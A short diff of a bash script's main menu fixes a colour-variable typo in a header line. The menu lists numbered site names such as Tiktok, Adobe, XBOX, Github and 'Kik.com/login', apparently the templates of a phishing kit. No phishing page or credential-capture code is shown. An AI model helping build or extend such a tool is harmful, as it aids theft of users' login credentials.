@@ -517,7 +517,7 @@ main_menu() {
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
 		
-		#{MAGENTA}~~~${GREEN}KIK STUFF FOR NOW${MAGENTA}~~~
+		${MAGENTA}~~~${GREEN}KIK STUFF FOR NOW${MAGENTA}~~~
 		
 		${RED}[${WHITE}34${RED}]${ORANGE} Rage Unbrick
 		${RED}[${WHITE}35${RED}]${ORANGE} Kik.com/login
